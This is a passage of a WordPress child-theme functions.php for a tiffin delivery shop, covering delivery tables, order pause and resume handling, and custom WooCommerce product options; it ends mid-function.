<?php
// Load Composer autoloader
require_once get_stylesheet_directory() . '/load-composer.php';

// Enqueue parent and child theme styles
function my_child_theme_enqueue_styles() {
    // Load parent theme stylesheet first
    wp_enqueue_style('parent-style', get_template_directory_uri() . '/style.css');
    
    // Load child theme stylesheet
    wp_enqueue_style('child-style', get_stylesheet_uri(), array('parent-style'));
}
add_action('wp_enqueue_scripts', 'my_child_theme_enqueue_styles');

// Create delivery database tables on theme activation
function create_delivery_database_tables() {
    // Include the delivery system first
    require_once get_stylesheet_directory() . '/delivery-system/delivery-system.php';
    
    // Check if tables have been created
    if (get_option('delivery_system_tables_created') !== 'yes') {
        // Create delivery system tables
        if (class_exists('Delivery_Database')) {
            Delivery_Database::create_tables();
            update_option('delivery_system_tables_created', 'yes');
            error_log('Delivery database tables created during theme activation');
        } else {
            error_log('Delivery_Database class not found during theme activation');
        }
    }
}
add_action('after_switch_theme', 'create_delivery_database_tables');

// Ensure delivery system database tables are created (fallback method) /// Deliverry ///
function ensure_delivery_system_tables_exist() {
    // Check if tables have been created
    if (get_option('delivery_system_tables_created') !== 'yes') {
        // Create delivery system tables
        if (class_exists('Delivery_Database')) {
            Delivery_Database::create_tables();
            update_option('delivery_system_tables_created', 'yes');
            error_log('Delivery database tables created during init');
        } else {
            error_log('Delivery_Database class not found during init');
        }
    }
}
add_action('init', 'ensure_delivery_system_tables_exist', 20); /// Deliverry ///

// Add a manual "create tables" admin action
function register_manual_create_tables_action() {
    if (!is_admin()) {
        return;
    }
    
    if (isset($_GET['action']) && $_GET['action'] === 'create_delivery_tables' && current_user_can('manage_options')) {
        // Include the delivery system
        require_once get_stylesheet_directory() . '/delivery-system/delivery-system.php';
        
        // Force table creation
        if (class_exists('Delivery_Database')) {
            Delivery_Database::create_tables();
            update_option('delivery_system_tables_created', 'yes');
            
            // Add admin notice
            add_action('admin_notices', function() {
                echo '<div class="notice notice-success is-dismissible"><p>' . 
                     __('Delivery system database tables have been created successfully.', 'hello-elementor-child') . 
                     '</p></div>';
            });
        } else {
            // Add admin notice for error
            add_action('admin_notices', function() {
                echo '<div class="notice notice-error is-dismissible"><p>' . 
                     __('Error: Delivery_Database class not found. Tables could not be created.', 'hello-elementor-child') . 
                     '</p></div>';
            });
        }
        
        // Redirect back to the delivery dashboard
        wp_redirect(admin_url('admin.php?page=delivery-system&tables_created=1'));
        exit;
    }
    
    // Show success notice after table creation (when redirected back)
    if (isset($_GET['page']) && $_GET['page'] === 'delivery-system' && isset($_GET['tables_created']) && $_GET['tables_created'] === '1') {
        add_action('admin_notices', function() {
            echo '<div class="notice notice-success is-dismissible"><p>' . 
                 __('Delivery system database tables have been created/verified successfully.', 'hello-elementor-child') . 
                 '</p></div>';
        });
    }
}
add_action('admin_init', 'register_manual_create_tables_action');

// Add delivery tables status check function (to be used by the dashboard)
function check_delivery_tables_status() {
    global $wpdb;
    $orders_table = $wpdb->prefix . 'delivery_orders';
    $routes_table = $wpdb->prefix . 'delivery_routes';
    $uploads_table = $wpdb->prefix . 'delivery_uploads';
    
    $tables_exist = (
        $wpdb->get_var("SHOW TABLES LIKE '$orders_table'") === $orders_table &&
        $wpdb->get_var("SHOW TABLES LIKE '$routes_table'") === $routes_table &&
        $wpdb->get_var("SHOW TABLES LIKE '$uploads_table'") === $uploads_table
    );
    
    return $tables_exist;
}

// Note: Footer status check has been moved to the dashboard page

// Add custom styling for delivery dashboard
function delivery_dashboard_custom_css() {
    if (isset($_GET['page']) && $_GET['page'] === 'delivery-system') {
        ?>
        <style>
            .delivery-system-stats {
                display: flex;
                flex-wrap: wrap;
                margin: 20px 0;
                gap: 20px;
            }
            
            .stats-card {
                background-color: #fff;
                padding: 20px;
                border-radius: 5px;
                box-shadow: 0 1px 3px rgba(0,0,0,0.1);
                flex: 1;
                min-width: 200px;
            }
            
            .stats-card h2 {
                margin-top: 0;
                font-size: 16px;
                color: #23282d;
            }
            
            .stats-value {
                font-size: 24px;
                font-weight: 600;
                margin-top: 10px;
                display: flex;
                align-items: center;
                flex-wrap: wrap;
                gap: 10px;
            }
            
            .stats-value .button {
                font-size: 13px;
                height: auto;
                padding: 4px 10px;
                margin-top: 5px;
            }
            
            @media (max-width: 782px) {
                .stats-card {
                    flex-basis: 100%;
                }
            }
        </style>
        <?php
    }
}
add_action('admin_head', 'delivery_dashboard_custom_css');




// Advanced Product Options Integration
// Exit if accessed directly

if (!defined('ABSPATH')) {
    exit;
}
////////////////////////////
//  Auto Resume Funtion   //
///////////////////////////
// Add manual check option in admin
function add_manual_resume_check() {
    if (isset($_GET['check_paused_orders']) && current_user_can('manage_options')) {
        check_paused_orders();
        wp_redirect(admin_url('admin.php?page=pause-management&checked=1'));
        exit;
    }
}
add_action('admin_init', 'add_manual_resume_check');

// Add notice for manual check completion
function show_resume_check_notice() {
    if (isset($_GET['checked'])) {
        ?>
        <div class="notice notice-success is-dismissible">
            <p><?php _e('Paused orders have been checked and processed.', 'woocommerce'); ?></p>
        </div>
        <?php
    }
}
add_action('admin_notices', 'show_resume_check_notice');

// Add manual check button to pause management page
function add_check_paused_orders_button($content) {
    $screen = get_current_screen();
    if ($screen->id === 'toplevel_page_pause-management') {
        $check_url = add_query_arg('check_paused_orders', '1', admin_url('admin.php'));
        echo '<div class="wrap">';
        echo '<h1>Pause Management</h1>';
        echo '<a href="' . esc_url($check_url) . '" class="page-title-action">';
        echo __('Check Paused Orders', 'woocommerce');
        echo '</a>';
        echo '</div>';
    }
}
add_action('admin_notices', 'add_check_paused_orders_button');


////////////////////////////
// Auto Resume Funtion End //
///////////////////////////


// Add AJAX handler for saving pause dates
function handle_save_pause_dates() {
    if (!current_user_can('manage_options')) {
        wp_send_json_error('Unauthorized');
        return;
    }

    $order_id = intval($_POST['order_id']);
    $dates = array_map('sanitize_text_field', $_POST['dates']);

    $order = wc_get_order($order_id);
    if (!$order) {
        wp_send_json_error('Invalid order');
        return;
    }

    update_post_meta($order_id, '_paused_dates', $dates);
    $order->update_status('paused');

    wp_send_json_success();
}
add_action('wp_ajax_save_pause_dates', 'handle_save_pause_dates');


// Handle tiffin resume
function handle_resume_tiffin() {
    if (!current_user_can('manage_options')) {
        wp_send_json_error('Unauthorized');
        return;
    }

    $order_id = intval($_POST['order_id']);
    $order = wc_get_order($order_id);
    
    if (!$order) {
        wp_send_json_error('Invalid order');
        return;
    }

    try {
        // Remove paused dates
        delete_post_meta($order_id, '_paused_dates');
        
        // Update order status back to processing
        $order->update_status('processing');
        
        // Add success notification
        add_action('admin_notices', function() {
            ?>
            <div class="notice notice-success is-dismissible">
                <p><?php _e('Tiffin service has been resumed successfully.', 'woocommerce'); ?></p>
            </div>
            <?php
        });
        
        wp_send_json_success();
    } catch (Exception $e) {
        wp_send_json_error($e->getMessage());
    }
}
add_action('wp_ajax_resume_tiffin', 'handle_resume_tiffin');

// Add custom action for resume events
function handle_tiffin_resume($order_id) {
    // Additional processing can be added here
    do_action('after_tiffin_resume', $order_id);
}
add_action('resume_tiffin', 'handle_tiffin_resume');

// Enqueue admin scripts and styles for pause management
function enqueue_pause_management_scripts($hook) {
    if ('toplevel_page_pause-management' !== $hook && 'pause-management_page_paused-tiffins' !== $hook) {
        return;
    }

    // Enqueue jQuery UI
    wp_enqueue_script('jquery-ui-core');
    wp_enqueue_script('jquery-ui-datepicker');
    wp_enqueue_style('jquery-ui-style', '//code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css');

    // Enqueue Multi Date Picker
    wp_enqueue_script(
        'jquery-ui-multidatepicker',
        get_stylesheet_directory_uri() . '/js/jquery-ui.multidatespicker.js',
        array('jquery-ui-datepicker'),
        '1.6.6',
        true
    );

    // Enqueue custom scripts and styles
    wp_enqueue_script(
        'pause-management',
        get_stylesheet_directory_uri() . '/js/pause-management.js',
        array('jquery', 'jquery-ui-multidatepicker'),
        '1.0',
        true
    );

    wp_enqueue_style(
        'pause-management',
        get_stylesheet_directory_uri() . '/css/pause-management.css',
        array(),
        '1.0'
    );
}
add_action('admin_enqueue_scripts', 'enqueue_pause_management_scripts');

// Add custom CSS for pause management
function add_pause_management_styles() {
    ?>
    <style>
        /* Modal styles */
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.4);
        }

        .modal-content {
            background-color: #fefefe;
            margin: 15% auto;
            padding: 20px;
            border: 1px solid #888;
            width: 80%;
            max-width: 500px;
        }

        .close {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }

        .close:hover,
        .close:focus {
            color: black;
            text-decoration: none;
            cursor: pointer;
        }

        /* Date picker styles */
        .ui-datepicker-calendar .ui-state-disabled {
            opacity: 0.35;
        }

        .ui-datepicker-calendar .ui-state-active {
            background: #007cba !important;
            color: white !important;
        }

        /* Button styles */
        .pause-tiffin-btn,
        .resume-tiffin-btn {
            margin: 2px;
        }

        #save-pause-dates {
            margin-top: 15px;
            float: right;
        }

        /* Table styles */
        .wp-list-table th {
            font-weight: 600;
        }

        .wp-list-table td {
            vertical-align: middle;
        }
    </style>
    <?php
}
add_action('admin_head', 'add_pause_management_styles');

// Add custom order status color
function add_paused_status_color($statuses) {
    $statuses['wc-paused'] = array(
        'label'  => _x('Paused', 'Order status', 'woocommerce'),
        'color'  => '#f4a460' // Sandy brown color
    );
    return $statuses;
}
add_filter('wc_order_statuses_colors', 'add_paused_status_color');

// Modify order status label in admin order list
function modify_paused_order_status_label($order_statuses) {
    $order_statuses['wc-paused'] = _x('Paused', 'Order status', 'woocommerce');
    return $order_statuses;
}
add_filter('wc_order_statuses', 'modify_paused_order_status_label');

// Add custom column to orders table for paused dates
function add_order_paused_dates_column($columns) {
    $new_columns = array();
    foreach ($columns as $key => $column) {
        $new_columns[$key] = $column;
        if ($key === 'order_status') {
            $new_columns['paused_dates'] = __('Paused Dates', 'woocommerce');
        }
    }
    return $new_columns;
}
add_filter('manage_edit-shop_order_columns', 'add_order_paused_dates_column', 20);

// Display paused dates in orders table
function display_order_paused_dates_column($column) {
    global $post;

    if ($column === 'paused_dates') {
        $order = wc_get_order($post->ID);
        if ($order->get_status() === 'paused') {
            $paused_dates = get_post_meta($post->ID, '_paused_dates', true);
            if (is_array($paused_dates)) {
                echo implode(', ', $paused_dates);
            }
        }
    }
}
add_action('manage_shop_order_posts_custom_column', 'display_order_paused_dates_column');

// Add pause dates to order notes
function add_pause_dates_order_note($order_id, $dates) {
    $order = wc_get_order($order_id);
    $dates_str = implode(', ', $dates);
    $order->add_order_note(
        sprintf(__('Tiffin delivery paused for the following dates: %s', 'woocommerce'), $dates_str),
        0, // Customer-facing note
        true // Added by system
    );
}
add_action('save_pause_dates', 'add_pause_dates_order_note', 10, 2);

// Add resume note to order
function add_resume_order_note($order_id) {
    $order = wc_get_order($order_id);
    $order->add_order_note(
        __('Tiffin delivery resumed', 'woocommerce'),
        0, // Customer-facing note
        true // Added by system
    );
}
add_action('resume_tiffin', 'add_resume_order_note');

// Validate pause dates before saving
function validate_pause_dates($dates, $order_id) {
    $order = wc_get_order($order_id);
    $remaining_tiffins = Satguru_Tiffin_Calculator::calculate_remaining_tiffins($order);
    
    if (count($dates) > $remaining_tiffins) {
        return new WP_Error('invalid_dates', 
            sprintf(__('Cannot pause more dates than remaining tiffins (%d)', 'woocommerce'), 
            $remaining_tiffins)
        );
    }
    
    return true;
}
add_filter('pre_save_pause_dates', 'validate_pause_dates', 10, 2);

// Include pause management functionality
require_once get_stylesheet_directory() . '/pause-management.php';

// Include customers page functionality
require_once get_stylesheet_directory() . '/customers-page.php';
require_once get_stylesheet_directory() . '/renewals-page.php';
require_once get_stylesheet_directory() . '/inc/delivery-slots.php';
require_once get_stylesheet_directory() . '/inc/whatsapp-webhook.php';

// Create database table and import customers on theme activation
register_activation_hook(__FILE__, 'create_customers_data_table');
register_activation_hook(__FILE__, 'import_existing_customers');

// Ensure table exists even if activation hook didn't run
add_action('init', 'ensure_customers_table_exists');

function ensure_customers_table_exists() {
    // Check if table exists
    global $wpdb;
    $table_name = $wpdb->prefix . 'customers_data';
    
    if($wpdb->get_var("SHOW TABLES LIKE '$table_name'") != $table_name) {
        create_customers_data_table();
        import_existing_customers();
    }
}

//

// // Schedule daily tiffin count save at 11 PM EST
// if (!wp_next_scheduled('save_daily_tiffin_count')) {
//     // Convert 11 PM EST to timestamp
//     $est_timezone = new DateTimeZone('America/New_York');
//     $est_time = new DateTime('today 23:00:00', $est_timezone);
//     $gmt_time = $est_time->getTimestamp();
    
//     // Schedule the event
//     wp_schedule_event($gmt_time, 'daily', 'save_daily_tiffin_count');
// }

// Hook for the cron job
add_action('save_daily_tiffin_count', function() {
    Satguru_Tiffin_Calculator::save_daily_tiffin_count();
});

// Make sure the cron job runs when delivery days are updated 
add_action('update_option_satguru_delivery_start_day', 'trigger_tiffin_count_save');
add_action('update_option_satguru_delivery_end_day', 'trigger_tiffin_count_save');

function trigger_tiffin_count_save() {
    Satguru_Tiffin_Calculator::save_daily_tiffin_count();
}

// Include admin dashboard functionality
require_once get_stylesheet_directory() . '/admin-dashboard.php';
require_once get_stylesheet_directory() . '/admin-settings.php';
require_once get_stylesheet_directory() . '/add-order.php';
require_once get_stylesheet_directory() . '/otp-login.php';
require_once get_stylesheet_directory() . '/finance.php';
// Include delivery system
//require_once get_stylesheet_directory() . '/delivery-system/delivery-system.php';



// Enqueue custom styles for product page
function enqueue_custom_product_styles() {
    if (is_product()) {
        wp_enqueue_style('custom-product-styles', get_stylesheet_directory_uri() . '/css/custom-product-page.css', array(), '1.0.0');
    }
}
add_action('wp_enqueue_scripts', 'enqueue_custom_product_styles');
// customer page funtion start // 




// customer product page funtion end // 



// Add image upload option for custom button designs
function apo_add_image_upload_option() {
    add_action('admin_enqueue_scripts', 'apo_enqueue_media_uploader');
    add_action('edit_form_after_title', 'apo_add_image_upload_field');
    add_action('save_post', 'apo_save_image_upload_field');
}
add_action('init', 'apo_add_image_upload_option');

function apo_enqueue_media_uploader() {
    wp_enqueue_media();
    wp_enqueue_script('apo-media-upload', get_stylesheet_directory_uri() . '/js/media-upload.js', array('jquery'), '1.0', true);
}

function apo_add_image_upload_field($post) {
    if ($post->post_type !== 'apo_option_group') return;

    $image_id = get_post_meta($post->ID, '_apo_custom_button_image', true);
    $image_url = $image_id ? wp_get_attachment_url($image_id) : '';
    ?>
    <div class="apo-image-upload">
        <label for="apo_custom_button_image">Custom Button Image:</label>
        <input type="hidden" name="apo_custom_button_image" id="apo_custom_button_image" value="<?php echo esc_attr($image_id); ?>">
        <img src="<?php echo esc_url($image_url); ?>" style="max-width: 100px; display: <?php echo $image_url ? 'block' : 'none'; ?>;">
        <button type="button" class="button" id="apo_upload_image_button">Upload Image</button>
        <button type="button" class="button" id="apo_remove_image_button" style="display: <?php echo $image_url ? 'inline-block' : 'none'; ?>;">Remove Image</button>
    </div>
    <?php
}

function apo_save_image_upload_field($post_id) {
    if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) return;
    if (!current_user_can('edit_post', $post_id)) return;

    if (isset($_POST['apo_custom_button_image'])) {
        update_post_meta($post_id, '_apo_custom_button_image', sanitize_text_field($_POST['apo_custom_button_image']));
    }
}


// Enqueue admin scripts and styles for pause management
function apo_enqueue_scripts() {
    // Enqueue the main APO styles
    wp_enqueue_style(
        'apo-styles',
        get_stylesheet_directory_uri() . '/css/apo-styles.css',
        array(),
        '1.0'
    );

    // Enqueue Flatpickr CSS and JS
    wp_enqueue_style(
        'flatpickr-css',
        'https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css',
        array(),
        '4.6.13'
    );
    
    // Optional: Enqueue a theme (this one matches your example better)
    wp_enqueue_style(
        'flatpickr-theme',
        'https://cdn.jsdelivr.net/npm/flatpickr/dist/themes/airbnb.css',
        array('flatpickr-css'),
        '4.6.13'
    );

    wp_enqueue_script(
        'flatpickr-js',
        'https://cdn.jsdelivr.net/npm/flatpickr',
        array('jquery'),
        '4.6.13',
        true
    );

    // Your custom JS file
    wp_enqueue_script(
        'apo-scripts',
        get_stylesheet_directory_uri() . '/js/apo-scripts.js',
        array('jquery', 'flatpickr-js'),
        '1.0',
        true
    );

    // Only load these scripts on product pages
    if (is_product()) {
        // Enqueue jQuery UI
        wp_enqueue_script('jquery-ui-core');
        wp_enqueue_script('jquery-ui-datepicker');
        wp_enqueue_style('jquery-ui-style', '//code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css');

        // Enqueue custom scripts
        wp_enqueue_script(
            'apo-scripts',
            get_stylesheet_directory_uri() . '/js/apo-scripts.js',
            array('jquery', 'jquery-ui-datepicker'),
            '1.0',
            true
        );
    }
}
add_action('wp_enqueue_scripts', 'apo_enqueue_scripts');



// Initialize the custom post type for option groups
function apo_init() {
    register_post_type('apo_option_group', array(
        'labels' => array(
            'name' => 'Option Groups',
            'singular_name' => 'Option Group',
        ),
        'public' => false,
        'show_ui' => true,
        'show_in_menu' => 'edit.php?post_type=product',
        'supports' => array('title'),
    ));
}
add_action('init', 'apo_init');

// Add meta box for option groups
function apo_add_meta_box() {
    add_meta_box(
        'apo_option_group_meta_box',
        'Product Options',
        'apo_option_group_meta_box_callback',
        'apo_option_group',
        'normal',
        'default'
    );
}
add_action('add_meta_boxes', 'apo_add_meta_box');

// Add a new meta box for product selection
function apo_add_product_selection_meta_box() {
    add_meta_box(
        'apo_product_selection_meta_box',
        'Select Products',
        'apo_product_selection_meta_box_callback',
        'apo_option_group',
        'side',
        'default'
    );
}
add_action('add_meta_boxes', 'apo_add_product_selection_meta_box');


// Callback function for the product selection meta box
function apo_product_selection_meta_box_callback($post) {
    wp_nonce_field('apo_save_product_selection', 'apo_product_selection_nonce');

    $selected_products = get_post_meta($post->ID, '_apo_selected_products', true);
    if (!is_array($selected_products)) {
        $selected_products = array();
    }

    $products = wc_get_products(array('status' => 'publish', 'limit' => -1));

    echo '<select name="apo_selected_products[]" multiple style="width: 100%; height: 200px;">';
    foreach ($products as $product) {
        $selected = in_array($product->get_id(), $selected_products) ? 'selected' : '';
        echo '<option value="' . esc_attr($product->get_id()) . '" ' . $selected . '>' . esc_html($product->get_name()) . '</option>';
    }
    echo '</select>';
    echo '<p>Hold Ctrl (Windows) or Cmd (Mac) to select multiple products.</p>';
}

// Meta box callback
function apo_option_group_meta_box_callback($post) {
    wp_nonce_field('apo_save_meta_box_data', 'apo_meta_box_nonce');

    $options = get_post_meta($post->ID, '_apo_options', true);
    if (!is_array($options)) {
        $options = array();
    }

    ?>
    <div id="apo_options">
        <?php foreach ($options as $index => $option) : ?>
            <?php apo_render_option_fields($option, $index); ?>
        <?php endforeach; ?>
    </div>
    <button type="button" id="add_option" class="button">Add Option</button>

    <script>
    jQuery(document).ready(function($) {
        var optionIndex = <?php echo count($options); ?>;

        $('#add_option').on('click', function() {
            var newOption = <?php echo json_encode(apo_get_empty_option()); ?>;
            var optionHtml = apo_render_option_fields_js(newOption, optionIndex);
            $('#apo_options').append(optionHtml);
            optionIndex++;
        });

        $('#apo_options').on('click', '.remove-option', function() {
            $(this).closest('.apo-option').remove();
        });

        $(document).on('change', '.apo-option-type', function() {
            var $option = $(this).closest('.apo-option');
            var type = $(this).val();
            if (type === 'image') {
                $option.find('.apo-image-upload').show();
            } else {
                $option.find('.apo-image-upload').hide();
            }
        });
    });

    function apo_render_option_fields_js(option, index) {
        var html = '<div class="apo-option">';
        html += '<p><label>Option Name: <input type="text" name="apo_option_name[]" value="' + (option.name || '') + '" required></label></p>';
        html += '<p><label>Option Type: <select name="apo_option_type[]" class="apo-option-type">';
        var types = ['radio', 'checkbox', 'select', 'text', 'date', 'image'];
        types.forEach(function(type) {
            html += '<option value="' + type + '"' + (option.type === type ? ' selected' : '') + '>' + type.charAt(0).toUpperCase() + type.slice(1) + '</option>';
        });
        html += '</select></label></p>';
        html += '<p><label>Required: <input type="checkbox" name="apo_option_required[]" value="1"' + (option.required ? ' checked' : '') + '></label></p>';
        html += '<p><label>Choices and Price Adjustments:<br><textarea name="apo_option_choices_and_prices[]" rows="5" cols="50" placeholder="Choice|Price or Choice|*Multiplier">' + (option.choices ? option.choices.map((choice, i) => choice + '|' + (option.price_multipliers[i] || '')).join("\n") : '') + '</textarea></label></p>';
        html += '<div class="apo-image-upload" style="display: ' + (option.type === 'image' ? 'block' : 'none') + ';">';
        html += '<p><label>Custom Image: <input type="hidden" name="apo_option_custom_image[]" class="apo-custom-image-id" value="' + (option.custom_image || '') + '"></label></p>';
        html += '<img src="" class="apo-custom-image-preview" style="max-width: 100px; display: none;">';
        html += '<button type="button" class="button apo-upload-custom-image">Upload Image</button>';
        html += '<button type="button" class="button apo-remove-custom-image" style="display: none;">Remove Image</button>';
        html += '</div>';
        html += '<button type="button" class="button remove-option">Remove Option</button>';
        html += '</div>';
        return html;
    }
    </script>
    <?php
}

function apo_render_option_fields($option, $index) {
    ?>
    <div class="apo-option">
        <p>
            <label>Option Name: <input type="text" name="apo_option_name[]" value="<?php echo esc_attr($option['name']); ?>" required></label>
        </p>
        <p>
            <label>Option Type:
                <select name="apo_option_type[]" class="apo-option-type">
                    <option value="radio" <?php selected($option['type'], 'radio'); ?>>Radio Buttons</option>
                    <option value="checkbox" <?php selected($option['type'], 'checkbox'); ?>>Checkboxes</option>
                    <option value="select" <?php selected($option['type'], 'select'); ?>>Dropdown</option>
                    <option value="text" <?php selected($option['type'], 'text'); ?>>Text Input</option>
                    <option value="date" <?php selected($option['type'], 'date'); ?>>Date Picker</option>
                    <option value="image" <?php selected($option['type'], 'image'); ?>>Image Buttons</option>
                </select>
            </label>
        </p>
        <p>
            <label>Required: <input type="checkbox" name="apo_option_required[]" value="1" <?php checked($option['required'], true); ?>></label>
        </p>
        <p>
            <label>Choices and Price Adjustments:<br>
                <small>Format: Choice|Price or Choice|*Multiplier (e.g., "Large|2.00" or "Double|*2")</small><br>
                <textarea name="apo_option_choices_and_prices[]" rows="5" cols="50" placeholder="Choice|Price or Choice|*Multiplier"><?php 
                    $choices_and_prices = array();
                    foreach ($option['choices'] as $key => $choice) {
                        $adjustment = isset($option['price_adjustments'][$key]) ? $option['price_adjustments'][$key] : 0;
                        $multiplier = isset($option['price_multipliers'][$key]) ? $option['price_multipliers'][$key] : '';
                        
                        if ($multiplier) {
                            $choices_and_prices[] = $choice . '|*' . $multiplier;
                        } else {
                            $choices_and_prices[] = $choice . '|' . $adjustment;
                        }
                    }
                    echo esc_textarea(implode("\n", $choices_and_prices)); 
                ?></textarea>
            </label>
        </p>
        <div class="apo-image-upload" style="display: <?php echo $option['type'] === 'image' ? 'block' : 'none'; ?>;">
            <p>
                <label>Custom Image: 
                    <input type="hidden" name="apo_option_custom_image[]" class="apo-custom-image-id" value="<?php echo esc_attr($option['custom_image'] ?? ''); ?>">
                </label>
            </p>
            <?php 
            $image_url = wp_get_attachment_image_url($option['custom_image'] ?? '', 'thumbnail');
            $image_style = $image_url ? '' : 'display: none;';
            $remove_style = $image_url ? '' : 'display: none;';
            ?>
            <img src="<?php echo esc_url($image_url); ?>" class="apo-custom-image-preview" style="max-width: 100px; <?php echo $image_style; ?>">
            <button type="button" class="button apo-upload-custom-image">Upload Image</button>
            <button type="button" class="button apo-remove-custom-image" style="<?php echo $remove_style; ?>">Remove Image</button>
        </div>
        <button type="button" class="button remove-option">Remove Option</button>
    </div>
    <?php
}

function apo_get_empty_option() {
    return array(
        'id' => uniqid(),
        'name' => '',
        'type' => 'radio',
        'required' => false,
        'choices' => array(),
        'price_adjustments' => array(),
        'price_multipliers' => array(),
        'custom_image' => '',
    );
}

// Save meta box data
function apo_save_meta_box_data($post_id) {
    if (!isset($_POST['apo_meta_box_nonce'])) {
        return;
    }

    if (!wp_verify_nonce($_POST['apo_meta_box_nonce'], 'apo_save_meta_box_data')) {
        return;
    }

    if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
        return;
    }

    if (!current_user_can('edit_post', $post_id)) {
        return;
    }

    $options = array();

    if (isset($_POST['apo_option_name'])) {
        $names = $_POST['apo_option_name'];
        $types = $_POST['apo_option_type'];
        $required = isset($_POST['apo_option_required']) ? $_POST['apo_option_required'] : array();
        $choices_and_prices = $_POST['apo_option_choices_and_prices'];

        for ($i = 0; $i < count($names); $i++) {
            $choices = array();
            $price_adjustments = array();
            $price_multipliers = array();
            
            $lines = explode("\n", sanitize_textarea_field($choices_and_prices[$i]));
            foreach ($lines as $line) {
                $parts = explode('|', trim($line));
                if (count($parts) == 2) {
                    $choices[] = $parts[0];
                    
                    // Check if it's a multiplier (starts with *)
                    if (strpos($parts[1], '*') === 0) {
                        $multiplier = floatval(substr($parts[1], 1));
                        $price_multipliers[] = $multiplier;
                        $price_adjustments[] = 0;
                    } else {
                        $price_adjustments[] = floatval($parts[1]);
                        $price_multipliers[] = '';
                    }
                }
            }

            $options[] = array(
                'id' => uniqid(),
                'name' => sanitize_text_field($names[$i]),
                'type' => sanitize_text_field($types[$i]),
                'required' => isset($required[$i]),
                'choices' => $choices,
                'price_adjustments' => $price_adjustments,
                'price_multipliers' => $price_multipliers,
            );
        }
    }

    update_post_meta($post_id, '_apo_options', $options);
}
add_action('save_post_apo_option_group', 'apo_save_meta_box_data');

// Save the selected products
function apo_save_product_selection($post_id) {
    if (!isset($_POST['apo_product_selection_nonce']) || !wp_verify_nonce($_POST['apo_product_selection_nonce'], 'apo_save_product_selection')) {
        return;
    }

    if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
        return;
    }

    if (!current_user_can('edit_post', $post_id)) {
        return;
    }

    if (isset($_POST['apo_selected_products'])) {
        $selected_products = array_map('intval', $_POST['apo_selected_products']);
        update_post_meta($post_id, '_apo_selected_products', $selected_products);
    } else {
        delete_post_meta($post_id, '_apo_selected_products');
    }
}
add_action('save_post_apo_option_group', 'apo_save_product_selection');

// Enqueue admin scripts
function apo_enqueue_admin_scripts($hook) {
    global $post;

    if ($hook == 'post-new.php' || $hook == 'post.php') {
        if ('apo_option_group' === $post->post_type) {
            wp_enqueue_media();
            wp_enqueue_script('apo-admin-script', get_stylesheet_directory_uri() . '/js/apo-admin.js', array('jquery'), '1.0', true);
        }
    }
}
add_action('admin_enqueue_scripts', 'apo_enqueue_admin_scripts');

// Display options on the product page
function apo_display_product_options() {
    global $product;

    if (!$product) {
        return;
    }

    $product_id = $product->get_id();

    $option_groups = get_posts(array(
        'post_type' => 'apo_option_group',
        'posts_per_page' => -1,
    ));

    foreach ($option_groups as $group) {
        $selected_products = get_post_meta($group->ID, '_apo_selected_products', true);
        
        if (is_array($selected_products) && in_array($product_id, $selected_products)) {
            $options = get_post_meta($group->ID, '_apo_options', true);
            if (!empty($options)) {
                echo '<div class="apo-option-group">';
                echo '<h3>' . esc_html($group->post_title) . '</h3>';
                echo '<div class="apo-options-container">'; // New container for grid layout
                foreach ($options as $option) {
                    apo_render_option($option);
                }
                echo '</div>'; // Close grid container
                echo '</div>';
            }
        }
    }
}
add_action('woocommerce_before_add_to_cart_button', 'apo_display_product_options');

///////////////////////////////////////////////////////////////
// THIS OPTION IS CHANAGED IF REQUIRED CHANGE IT ORIGINAL ONE 
//////////////////////////////////////////////////////////////


// Render individual option
function apo_render_option($option) {
    $required = $option['required'] ? 'required' : '';
    $name = 'apo_' . $option['id'];
    
    echo '<div class="apo-option">';
    echo '<label>' . esc_html($option['name']) . ($option['required'] ? ' <span class="required">*</span>' : '') . '</label>';

    switch ($option['type']) {
        case 'radio':
            foreach ($option['choices'] as $key => $choice) {
                $price_adjustment = isset($option['price_adjustments'][$key]) ? $option['price_adjustments'][$key] : 0;
                echo '<label class="radio-label">';
                echo '<input type="radio" name="' . esc_attr($name) . '" value="' . esc_attr($choice) . '" ' . $required . '>';
                echo '<span>' . esc_html($choice);
                if ($price_adjustment != 0) {
                    echo ' <span class="price-adjustment">(' . wc_price($price_adjustment) . ')</span>';
                }
                echo '</span>';
                echo '</label>';
            }
            break;
            
            case 'select':
                echo '<select name="' . esc_attr($name) . '" ' . $required . ' class="form-select">';
                echo '<option value="">Select ' . esc_html($option['name']) . '</option>';
                foreach ($option['choices'] as $key => $choice) {
                    $price_adjustment = isset($option['price_adjustments'][$key]) ? $option['price_adjustments'][$key] : 0;
                    echo '<option value="' . esc_attr($choice) . '">';
                    echo esc_html($choice);
                    if ($price_adjustment != 0) {
                        echo ' (' . wc_price($price_adjustment) . ')';
                    }
                    echo '</option>';
                }
                echo '</select>';
                break;
            
        case 'text':
            echo '<input type="text" name="' . esc_attr($name) . '" placeholder="Enter ' . esc_attr($option['name']) . '" ' . $required . '>';
            break;
            
        case 'date':
            echo '<input type="text" name="' . esc_attr($name) . '" class="apo-datepicker" placeholder="Select ' . esc_attr($option['name']) . '" ' . $required . '>';
            break;
    }
    
    echo '</div>';
}

///////////////////////////////////////////////////////////////
// THIS OPTION IS CHANAGED IF REQUIRED CHANGE IT ORIGINAL ONE 
//////////////////////////////////////////////////////////////

// Validate date
function apo_validate_date($date) {
    $today = new DateTime();
    $selected_date = new DateTime($date);
    $day_of_week = $selected_date->format('N');

    // Check if the date is today or in the past
    if ($selected_date <= $today) {
        return false;
    }

    // Check if the date is a weekend (6 = Saturday, 7 = Sunday)
    if ($day_of_week >= 6) {
        return false;
    }

    return true;
}

// Add to cart validation
function apo_add_to_cart_validation($passed, $product_id, $quantity) {
    $option_groups = get_posts(array(
        'post_type' => 'apo_option_group',
        'posts_per_page' => -1,
    ));

    foreach ($option_groups as $group) {
        $selected_products = get_post_meta($group->ID, '_apo_selected_products', true);
        
        // Check if the current product is selected for this option group
        if (is_array($selected_products) && in_array($product_id, $selected_products)) {
            $options = get_post_meta($group->ID, '_apo_options', true);
            foreach ($options as $option) {
